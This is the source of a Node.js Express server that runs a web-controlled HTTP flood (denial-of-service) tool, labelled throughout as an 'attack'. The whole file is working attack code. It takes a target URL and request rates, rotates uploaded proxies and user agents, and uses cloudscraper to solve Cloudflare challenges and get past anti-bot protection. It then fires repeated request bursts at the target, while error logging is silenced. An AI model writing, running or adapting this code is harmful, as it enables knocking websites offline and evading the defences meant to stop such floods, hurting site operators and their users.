const express = require('express');
const bodyParser = require('body-parser');
const CloudScraper = require('cloudscraper');
const http = require('http');
const WebSocket = require('ws');
const multer = require('multer');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Set up multer for handling file uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

let attackInterval;
let connectedClients = new Set();

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

wss.on('connection', (ws) => {
  console.log('Client connected');
  connectedClients.add(ws);

  ws.on('close', () => {
    console.log('Client disconnected');
    connectedClients.delete(ws);
  });
});

app.post('/start-attack', upload.fields([{ name: 'proxy', maxCount: 1 }, { name: 'userAgent', maxCount: 1 }]), async (req, res) => {
  const { url, delay, count, duration } = req.body;
  const proxyFile = req.files['proxy'] ? req.files['proxy'][0] : null;
  const userAgentFile = req.files['userAgent'] ? req.files['userAgent'][0] : null;

  const target = url.trim();
  const attackDelay = parseInt(delay, 10) * 1000; // Convert to milliseconds
  const requestsPerIp = parseInt(count, 10);
  const attackDuration = parseInt(duration, 10) * 1000; // Convert to milliseconds

  let proxies = [];
  let userAgents = [];

  // Check if the proxy file is provided
  if (proxyFile) {
    proxies = proxyFile.buffer.toString().split('\n').filter(Boolean);
  }

  // Check if the user-agent file is provided
  if (userAgentFile) {
    userAgents = userAgentFile.buffer.toString().split('\n').filter(Boolean);
  }

  function sendRequest() {
    let proxy;
    let userAgent;

    // Use a proxy if available
    if (proxies.length > 0) {
      proxy = proxies[Math.floor(Math.random() * proxies.length)];
    }

    // Use a user-agent if available
    if (userAgents.length > 0) {
      userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    const getHeaders = new Promise((resolve, reject) => {
      CloudScraper({
        uri: target,
        resolveWithFullResponse: true,
        proxy: proxy ? 'http://' + proxy : undefined,
        challengesToSolve: 10
      }, (error, response) => {
        if (error) {
          // Remove the proxy from the list if an error occurs
          if (proxy) {
            const objIndex = proxies.indexOf(proxy);
            proxies.splice(objIndex, 1);
          }

          const errorMessage = 'Error: ' + error.message;
          console.log(errorMessage);
          sendToClients(errorMessage);
        } else {
          resolve({ headers: response.request.headers, userAgent });
        }
      });
    });

    getHeaders.then((result) => {
      for (let i = 0; i < requestsPerIp; ++i) {
        CloudScraper({
          uri: target,
          headers: { ...result.headers, 'User-Agent': result.userAgent },
          proxy: proxy ? 'http://' + proxy : undefined,
          followAllRedirects: false
        }, (error, response) => {
          if (error) {
            const errorMessage = 'Error: ' + error.message;
            console.log(errorMessage);
            sendToClients(errorMessage);
          } else {
            const message = `Request ${i + 1}: Status Code - ${response.statusCode}`;
            console.log(message);
            sendToClients(message);
          }
        });
      }
    });
  }

  attackInterval = setInterval(() => {
    sendRequest();
  }, attackDelay);

  setTimeout(() => {
    clearInterval(attackInterval);
    console.log('Attack ended.');
    sendToClients('Traffic attack ended.');
  }, attackDuration);

  res.send('Traffic attack initiated.');
});

app.post('/stop-attack', (req, res) => {
  clearInterval(attackInterval);
  console.log('Attack stopped.');
  sendToClients('Traffic attack stopped.');
  res.send('Traffic attack stopped.');
});

function sendToClients(message) {
  connectedClients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}

// Hide unhandled rejection errors in console
process.on('uncaughtException', function (err) {
  // console.log(err);
});
process.on('unhandledRejection', function (err) {
  // console.log(err);
});

server.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});